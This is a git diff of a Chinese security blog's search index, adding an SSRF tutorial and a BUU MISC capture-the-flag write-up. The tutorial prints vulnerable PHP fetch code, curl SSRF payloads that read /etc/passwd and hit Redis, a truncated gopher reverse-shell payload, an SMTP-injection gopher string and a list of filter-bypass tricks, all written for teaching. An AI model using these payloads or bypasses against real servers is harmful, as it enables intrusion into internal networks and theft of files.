@@ -1,18 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>114514分钟能了解SSRF吗</title>
-    <url>/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/</url>
-    <content><![CDATA[<h1 id="♿1919810分钟能了解SSRF吗♿"><a href="#♿1919810分钟能了解SSRF吗♿" class="headerlink" title="♿1919810分钟能了解SSRF吗♿"></a>♿1919810分钟能了解SSRF吗♿</h1><p>冲刺♿，冲刺♿，冲♿</p>
-<h2 id="SSRF是扫码"><a href="#SSRF是扫码" class="headerlink" title="SSRF是扫码"></a>SSRF是扫码</h2><p>SSRF，全称<strong>Server-Side Request Forgery，服务器端请求伪造</strong></p>
-<p>关键词是<code>ip</code></p>
-<p>通过用户输入包含URL的功能&#x2F;请求参数包含外部资源应用来触发s</p>
-]]></content>
-      <tags>
-        <tag>-Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2025年中总结</title>
     <url>/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h1 id="凑新手-捐购-的年中总结"><a href="#凑新手-捐购-的年中总结" class="headerlink" title="凑新手(捐购)的年中总结"></a>凑新手(捐购)的年中总结</h1><p>刚考完狗史期末考试的下午，想着这个学期也结束了<br>感觉期末周忙了和没忙一样啊，也学不到东西。。。只是为了应付考试和那该死的保研名额(为了争这个也是被卷的不行哈哈…然后也发现和别人无意义的互怼内卷貌似也没啥意义，太累了)<br>当然考试周不能说是没有收获，毕竟这两周还是有点曲折哈哈。<br>先简单的回顾下上半年做了什么吧</p>
@@ -42,6 +30,224 @@
 ]]></content>
       <tags>
         <tag>-总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>114514分钟能了解SSRF吗</title>
+    <url>/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/</url>
+    <content><![CDATA[<h1 id="♿1919810分钟能了解SSRF吗♿"><a href="#♿1919810分钟能了解SSRF吗♿" class="headerlink" title="♿1919810分钟能了解SSRF吗♿"></a>♿1919810分钟能了解SSRF吗♿</h1><p>冲刺♿，冲刺♿，冲♿</p>
+<h2 id="SSRF是扫码"><a href="#SSRF是扫码" class="headerlink" title="SSRF是扫码"></a>SSRF是扫码</h2><p>SSRF，全称<strong>Server-Side Request Forgery，服务器端请求伪造</strong></p>
+<p>关键词是<code>ip</code></p>
+<p>通过用户输入包含URL的功能&#x2F;请求参数包含外部资源应用来触发s</p>
+<p>说白了就是通过一些方式偷偷的摸进内网视奸</p>
+<p>目前有记载的主流的在PHP</p>
+<p>说实话其实只要涉及对内网的文件有读取(从自身发起请求)，过滤又不充分的都会触发这个漏洞的</p>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><pre><code class="highlight php"><span class="title function_ invoke__">file_get_contents</span>()
+<span class="title function_ invoke__">fsockopen</span>()
+<span class="title function_ invoke__">curl_exec</span>()
+<span class="title function_ invoke__">fopen</span>()
+<span class="title function_ invoke__">readfile</span>()</code></pre>
+
+<p>先讲第一个</p>
+<ul>
+<li><code>file_get_contents()</code></li>
+</ul>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;
+<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);
+<span class="meta">?&gt;</span></code></pre>
+
+<p>从url这个参数里获取内容，并指定一个文件名进行保存</p>
+<p>而<code>file_put_contents</code>是把字符串写入文件当中</p>
+<ul>
+<li><code>fsockopen()</code></li>
+</ul>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span> 
+<span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; 
+    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); 
+    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; 
+        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; 
+    &#125; <span class="keyword">else</span> &#123; 
+        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; 
+        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; 
+        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; 
+        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; 
+        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); 
+        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; 
+        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; 
+            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); 
+        &#125; 
+        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); 
+        <span class="keyword">return</span> <span class="variable">$contents</span>; 
+    &#125; 
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+
+<p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
+<ul>
+<li><code>curl_exec()</code></li>
+</ul>
+<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span> 
+<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;
+    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
+    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();
+    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);
+    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);
+    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
+    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);
+    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);
+
+    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;
+    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); 
+    <span class="keyword">echo</span> <span class="variable">$result</span>;
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+
+<p><code>curl_exec</code>函数用于执行指定的cURL会话</p>
+<ul>
+<li><code>fopen()</code></li>
+<li><code>readfile()</code></li>
+</ul>
+<blockquote>
+<p>[!CAUTION]</p>
+</blockquote>
+<pre><code class="highlight plaintext">1.一般情况下PHP不会开启fopen的gopher wrapper
+2.file_get_contents的gopher协议不能URL编码
+3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
+4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
+5.curl_exec() //默认不跟踪跳转，
+6.file_get_contents() // file_get_contents支持php://input协议</code></pre>
+
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>对python的SSRF不太熟悉，故这里引用大佬的一些内容</p>
+<p>在Python中，常用的函数有urllib(urllib2)和requests库。以urllib(urllib2)为例， urllib并不支持gopher,dict协议，所以按照常理来讲ssrf在python中的危害也应该不大，但是当SSRF遇到CRLF，奇妙的事情就发生了。</p>
+<p>urllib曾爆出CVE-2019-9740、CVE-2019-9947两个漏洞，这两个漏洞都是urllib(urllib2)的CRLF漏洞，只是触发点不一样，其影响范围都在urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3之间，目前大部分服务器的python2版本都在2.7.10以下，python3都在3.6.x，这两个CRLF漏洞的影响力就非常可观了。其实之前还有一个CVE-2016-5699，同样的urllib（urllib2）的CRLF问题，但是由于时间比较早，影响范围没有这两个大，这里也不再赘叙</p>
+<p>python2代码如下：</p>
+<pre><code class="highlight plaintext">import sysimport urllib2host = &quot;127.0.0.1:7777?a=1 HTTP/1.1\r\nCRLF-injection: test\r\nTEST: 123&quot;url = &quot;http://&quot;+ host + &quot;:8080/test/?test=a&quot;try:  info = urllib2.urlopen(url).info()  print(info)except Exception as e:print(e)</code></pre>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>一般利用需要以下协议</p>
+<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>有回显的情况下可以打，读取任意内容</p>
+<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
+<pre><code class="highlight plaintext">http://test.org/ssrf.php?url=dict://127.0.0.1:6379/info  //查看reids相关配置
+
+如果ssrf.php中加上一行屏蔽回显的代码“curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);”，那么这种方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据了。</code></pre>
+
+<h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell.</p>
+<p>gopher包构造方法</p>
+<p><strong>GET包</strong></p>
+<pre><code class="highlight plaintext">截取第一行和第二行(全部url编码并且+_)
+GET ......
+Host ......</code></pre>
+
+<p>实例:</p>
+<pre><code class="highlight plaintext">GET /testg.php?name=xxx HTTP/1.1
+Host: 10.211.55.2
+可以构造为
+_%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a
+
+一定要手工补上换行%0d%0a</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250505140956343.png" alt="image-20250505140956343"></p>
+<p><strong>POST包</strong></p>
+<pre><code class="highlight plaintext">截取以下部分
+POST ....
+Host ....
+Content-Type: application/x-www-form-urlencoded
+Content-Length: i</code></pre>
+
+
+
+<h3 id="http-s"><a href="#http-s" class="headerlink" title="http&#x2F;s"></a>http&#x2F;s</h3><p>探测内网主机存活</p>
+<h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用:"></a>本地利用:</h3><p>（1）使用file协议 file protocol (任意文件读取)</p>
+<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=file:///etc/passwd&quot;</code></pre>
+
+<p>（2）使用dict协议 dict protocol (获取Redis配置信息)</p>
+<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=dict://127.0.0.1:6379/info&quot;</code></pre>
+
+<p>（3）使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)</p>
+<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=gopher://127.0.0.1:6379/_*1 %0d %0a $8%0d %0aflushall %0d %0a*3 %0d %0a $3%0d</code></pre>
+
+<h3 id="检测端口情况"><a href="#检测端口情况" class="headerlink" title="检测端口情况"></a>检测端口情况</h3><pre><code class="highlight plaintext">3306： MySQL
+443：tcp
+8080：TCP服务端默认端口、JBOSS、TOMCAT、Oracle XDB（XML 数据库）
+6379：Redis数据库端口</code></pre>
+
+
+
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>一般URL上会出现关键字类似于</p>
+<pre><code class="highlight plaintext">Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code></pre>
+
+<h3 id="排除法"><a href="#排除法" class="headerlink" title="排除法"></a>排除法</h3><p>浏览器f12查看源代码看是否是在本地进行了请求</p>
+<p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=URL,URL%E5%8F%82%E6%95%B0%E8%8B%A5%E6%98%AF%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p>
+<h3 id="dnslog等工具进行测试"><a href="#dnslog等工具进行测试" class="headerlink" title="dnslog等工具进行测试"></a>dnslog等工具进行测试</h3><p>看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p>
+<h3 id="分析请求的发起端"><a href="#分析请求的发起端" class="headerlink" title="分析请求的发起端"></a>分析请求的发起端</h3><p>抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p>
+<ul>
+<li>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</li>
+<li>通过二级域名暴力猜解工具模糊猜测内网地址</li>
+<li>通过file协议读取内网信息获取相关地址</li>
+</ul>
+<h3 id="留意返回信息"><a href="#留意返回信息" class="headerlink" title="留意返回信息"></a>留意返回信息</h3><p>直接返回的Banner、title、content等信息</p>
+<h3 id="留意布尔型SSRF"><a href="#留意布尔型SSRF" class="headerlink" title="留意布尔型SSRF"></a>留意布尔型SSRF</h3><p>通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p>
+<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><h3 id="任意指向-xip-io"><a href="#任意指向-xip-io" class="headerlink" title="任意指向(xip.io)"></a>任意指向(xip.io)</h3><pre><code class="highlight plaintext">http://127.0.0.1.xip.io/==&gt;http://127.0.0.1/</code></pre>
+
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用[::]"></a>利用[::]</h3><pre><code class="highlight plaintext">利用[::]绕过localhost 
+http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre>
+
+<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用@"></a>利用@</h3><pre><code class="highlight plaintext">http://example.com@127.0.0.1</code></pre>
+
+<h3 id="利用短链接"><a href="#利用短链接" class="headerlink" title="利用短链接"></a>利用短链接</h3><pre><code class="highlight plaintext">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1
+http://sudo.cc &gt;&gt;&gt;http://127.0.0.1</code></pre>
+
+<h3 id="修改类型"><a href="#修改类型" class="headerlink" title="修改类型"></a>修改类型</h3><pre><code class="highlight plaintext">修改&quot;type=file&quot;为&quot;type=url&quot;
+比如：
+上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</code></pre>
+
+<h3 id="利用Enclosed-alphanumerics"><a href="#利用Enclosed-alphanumerics" class="headerlink" title="利用Enclosed alphanumerics"></a>利用Enclosed alphanumerics</h3><pre><code class="highlight plaintext">利用Enclosed alphanumerics
+ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
+⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
+⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
+⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
+Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
+ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
+⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
+⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre>
+
+<h3 id="利用句号"><a href="#利用句号" class="headerlink" title="利用句号"></a>利用句号</h3><pre><code class="highlight plaintext">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></pre>
+
+<h3 id="利用进制转换"><a href="#利用进制转换" class="headerlink" title="利用进制转换"></a>利用进制转换</h3><pre><code class="highlight plaintext">例如192.168.0.1
+C0 A8 00 01
+8 进制格式：0300.0250.0.1
+16 进制格式：0xC0.0xA8.0.1
+10 进制整数格式：3232235521
+16 进制整数格式：0xC0A80001
+还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1
+
+127.0.0.1=&gt;7F 00 00 01
+可以是十六进制，八进制等。
+115.239.210.26  &gt;&gt;&gt;  16373751032
+首先把这四段数字给分别转成16进制，结果：73 ef d2 1a
+然后把 73efd21a 这十六进制一起转换成8进制
+记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</code></pre>
+
+<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><pre><code class="highlight plaintext">Dict://
+dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;
+ssrf.php?url=dict://attacker:11111/
+SFTP://
+ssrf.php?url=sftp://example.com:11111/
+TFTP://
+ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
+LDAP://
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
+Gopher://
+ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</code></pre>
+
+
+
+]]></content>
+      <tags>
+        <tag>-Web</tag>
       </tags>
   </entry>
   <entry>
@@ -379,6 +585,168 @@ bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
 ]]></content>
       <tags>
         <tag>-CTF -misc -WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU—MISC刷题记录</title>
+    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
+<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
+<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
+<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
+<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
+<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
+<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
+<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
+<p>主要是HTTP流量，直接追踪流</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
+<p>用<code>captfencoder</code>MD5一下结束战斗</p>
+<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
+<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
+<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
+<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
+<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
+<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
+<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
+<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
+<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
+<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
+<p>查完没有藏文件，那应该就是隐写了</p>
+<p>结果没有发现隐写，感觉被骗了</p>
+<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
+<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
+<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
+<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
+<p>成功了，打开提取的文件发现有PK头</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
+<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
+<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
+<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
+<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
+<p>foremost出一下，要密码，先尝试弱密码爆破</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
+<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
+<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
+<p>看来是改了后缀，010先查查看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
+<p>演都不演了…</p>
+<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
+<p>盯完帧没有东西，看看副本，发现已经损坏</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
+<p>（这里-其实是_）</p>
+<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
+<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
+<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
+<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
+<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
+<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
+</blockquote>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
+<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
+<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
+crc32 flag.jpg</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
+<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
+<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
+<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
+<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
+<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
